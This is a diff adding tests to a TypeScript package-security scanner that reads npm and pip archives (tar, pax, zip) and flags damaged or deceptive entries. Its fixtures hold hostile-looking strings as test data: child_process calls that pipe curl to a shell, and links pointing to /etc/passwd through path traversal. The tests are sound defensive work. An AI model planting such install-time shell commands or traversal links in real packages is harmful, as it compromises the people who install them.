@@ -9,7 +9,7 @@ import { tmpdir } from "node:os";
 import { join, relative, sep } from "node:path";
 import { deflateRawSync, gzipSync } from "node:zlib";
 import { LIMITS, readTar, readTgz, readZip, safePath, stripTop, writeTree } from "../src/sec/content/archive";
-import { compareLoose, contentCheck, hookCommand, integrityOk, pickPyFile, previousVersion, sandboxHere, worthReading, analyseBytes } from "../src/sec/content";
+import { compareLoose, contentCheck, hookCommand, integrityOk, pickPyFile, previousVersion, readClean, sandboxHere, worthReading, analyseBytes } from "../src/sec/content";
 import { grade, takenOver, type Analysis } from "../src/sec/content/grade";
 import { hookTargets, hostKind, mask, scanPackage, type Kind } from "../src/sec/content/scan";
 import { checkInstall, npmManifest, pkgCheckCommand, pkgCommand, plan, pypiProject, type Fetcher } from "../src/sec/pkg";
@@ -268,7 +268,113 @@ describe("archives are read without trusting them", () => {
     expect(readTar(tar([{ path: "a", data: "x".repeat(600) }]).subarray(0, 700)).partial).toContain("cut short");
     expect(readZip(zip([{ path: "a/", data: "" }, { path: "l", data: "/etc/passwd", symlink: true }])).problems[0].kind).toBe("link");
   });
+
+  test("a tar size field that is not a number, or a bad checksum, ends the read as damaged; the next file is never silently lost", () => {
+    const next = tar([{ path: "package/b.js", data: "require('child_process').exec('curl x|sh')" }]);
+    // What the review did: a first header whose size is not octal, then a normal entry.
+    const bad = (field: string | Buffer) => Buffer.concat([withField(header("package/a.js", 0, "0", 0o644), 124, field), next]);
+    for (const field of ["zzzzzzzzzzz\0", "12zz\0\0\0\0\0\0\0\0", "-0000000001\0", Buffer.from([0xff, ...Array(11).fill(0xff)])]) {
+      const a = readTar(bad(field));
+      expect([String(field), a.partial]).toEqual([String(field), "the archive is damaged"]);
+      expect(a.problems.find((p) => p.kind === "damaged")?.detail).toContain("size field");
+      expect(a.entries.map((e) => e.path)).toEqual([]);
+    }
+    // The checksum field the same way: not octal is not a header.
+    expect(readTar(Buffer.concat([withField(header("package/a.js", 0, "0", 0o644), 148, "zzzzzz\0 ", false), next])).problems[0]).toMatchObject({ kind: "damaged", detail: expect.stringContaining("checksum") });
+    // GNU base-256 sizes are read (top bit set, big-endian).
+    const b256 = Buffer.alloc(12);
+    b256[0] = 0x80;
+    b256[11] = 5;
+    const a = readTar(Buffer.concat([withField(header("package/c.js", 0, "0", 0o644), 124, b256), Buffer.from("hello"), Buffer.alloc(507), Buffer.alloc(1024)]));
+    expect(a.partial).toBeUndefined();
+    expect(a.entries.map((e) => [e.path, e.size, e.data?.toString()])).toEqual([["package/c.js", 5, "hello"]]);
+  });
+
+  test("pax size, path and linkpath decide the entry, as npm's node-tar and pip's tarfile read it", () => {
+    // The header says 0 bytes; the pax record says 40: an installer reads 40, and so does vswarm.
+    const body = "require('child_process').exec('curl x')";
+    const t = Buffer.concat([...paxEntry({ size: String(body.length), path: "package/install.js" }), header("package/x", 0, "0", 0o644), pad(body), Buffer.alloc(1024)]);
+    const a = readTar(t);
+    expect(a.partial).toBeUndefined();
+    expect(a.entries.map((e) => [e.path, e.size, e.data?.toString()])).toEqual([["package/install.js", body.length, body]]);
+    // linkpath names a link's target.
+    const l = readTar(Buffer.concat([...paxEntry({ linkpath: "../../../../etc/passwd" }), header("package/l", 0, "2", 0o777, "harmless"), Buffer.alloc(1024)]));
+    expect(l.problems[0]).toMatchObject({ kind: "link", detail: expect.stringContaining("/etc/passwd (outside the package)") });
+    // A pax size that is not a number, a malformed record, or a global header moving paths: damaged, read no further.
+    expect(readTar(Buffer.concat([...paxEntry({ size: "12x" }), header("package/x", 0, "0", 0o644), Buffer.alloc(1024)])).partial).toBe("the archive is damaged");
+    const broken = Buffer.from("99 path=x\n");
+    expect(readTar(Buffer.concat([header("PaxHeader", broken.length, "x", 0o644), pad(broken), header("package/x", 0, "0", 0o644), Buffer.alloc(1024)])).partial).toBe("the archive is damaged");
+    const g = readTar(Buffer.concat([...paxEntry({ path: "evil.js" }, "g"), ...tarParts([{ path: "package/a.js", data: "1" }])]));
+    expect(g.problems[0].detail).toContain("global pax header sets path");
+    // A global header with only a comment (git archive writes one) is fine.
+    expect(readTar(Buffer.concat([...paxEntry({ comment: "4b83a48" }, "g"), ...tarParts([{ path: "package/a.js", data: "1" }])])).partial).toBeUndefined();
+  });
+
+  test("zip: a local header that names another file, two entries for one path, a non-UTF-8 name: damaged, as pip would read them differently", () => {
+    const z = zip([{ path: "pkg/a.py", data: "x = 1" }]);
+    // The local header names a .pth (pip refuses the entry; other unzippers unpack that name). Same length, so offsets stay.
+    const swapped = Buffer.from(z);
+    swapped.write("pkg/a.pt", 30);
+    expect(readZip(swapped).problems.find((p) => p.kind === "damaged")?.detail).toContain("local header names");
+    expect(readZip(swapped).partial).toBe("the archive is damaged");
+    const dup = readZip(zip([{ path: "pkg/a.py", data: "x = 1" }, { path: "pkg/./a.py", data: "import os" }]));
+    expect(dup.problems.map((p) => p.detail)).toContain("a second entry for the same path: which one counts depends on the tool that unpacks it");
+    expect(dup.partial).toBeDefined();
+    const latin = readZip(zip([{ path: "pkg/é.py", data: "x" }]));
+    expect(latin.problems[0].detail).toContain("code page 437");
+    // A clean wheel stays clean.
+    expect(readZip(zip([{ path: "pkg/a.py", data: "x", deflate: true }, { path: "pkg/b.py", data: "y" }]))).toMatchObject({ partial: undefined, problems: [] });
+  });
+
+  test("a damaged or partial read is never cached as clean: the guard reads it again next time", async () => {
+    expect(readClean({ problems: [{ kind: "damaged", path: "" }] })).toBe(false);
+    expect(readClean({ problems: [{ kind: "link", path: "x" }] })).toBe(true);
+    expect(readClean({ partial: "ran out of time", problems: [] })).toBe(false);
+    const d = tmp("damaged");
+    const real = tar([{ path: "package/package.json", data: '{"name":"vs-fixture-damaged","version":"1.0.0"}' }, { path: "package/index.js", data: "module.exports = 1;" }]);
+    const bytes = gzipSync(Buffer.concat([withField(header("package/a.js", 0, "0", 0o644), 124, "zzzzzzzzzzz\0"), real]));
+    const reg = registry([{ name: "vs-fixture-damaged", version: "1.0.0", bytes, at: Date.now() - 3_600_000 }]);
+    const cache = osvCache(d, ["npm:vs-fixture-damaged@1.0.0", "npm:root@1"]);
+    for (let i = 0; i < 2; i++) {
+      const r = await checkInstall(plan("npm", ["install", "vs-fixture-damaged@1.0.0"], d), { get: reg.get, osvCache: cache });
+      expect(r.findings.map((f) => f.id)).toContain("pkg:content:damaged:npm:vs-fixture-damaged@1.0.0");
+    }
+    expect(reg.calls.filter((u) => u.endsWith(".tgz")).length).toBe(2);
+  });
 });
+
+/** A header with one field replaced (bytes at `at`), and its checksum made right again unless `resum` is false. */
+function withField(h: Buffer, at: number, field: string | Buffer, resum = true): Buffer {
+  const out = Buffer.from(h);
+  const f = Buffer.from(field);
+  f.copy(out, at);
+  if (resum) {
+    out.write("        ", 148);
+    let sum = 0;
+    for (const b of out) sum += b;
+    out.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
+  }
+  return out;
+}
+
+const pad = (d: string | Buffer) => {
+  const b = Buffer.from(d);
+  return Buffer.concat([b, Buffer.alloc((512 - (b.length % 512)) % 512)]);
+};
+
+/** A pax header (x, or g for global) with these records. */
+function paxEntry(recs: Record<string, string>, type = "x"): Buffer[] {
+  const body = Buffer.from(Object.entries(recs).map(([k, v]) => {
+    const rest = ` ${k}=${v}\n`;
+    let len = rest.length + 1;
+    while (`${len}${rest}`.length !== len) len = `${len}${rest}`.length;
+    return `${len}${rest}`;
+  }).join(""));
+  return [header("PaxHeader", body.length, type, 0o644), pad(body)];
+}
+
+/** tar() as a list of parts, to follow headers built by hand. */
+const tarParts = (files: F[]) => [tar(files)];
 
 describe("detectors", () => {
   const one = (files: Record<string, string>, kind: Kind = "npm") =>
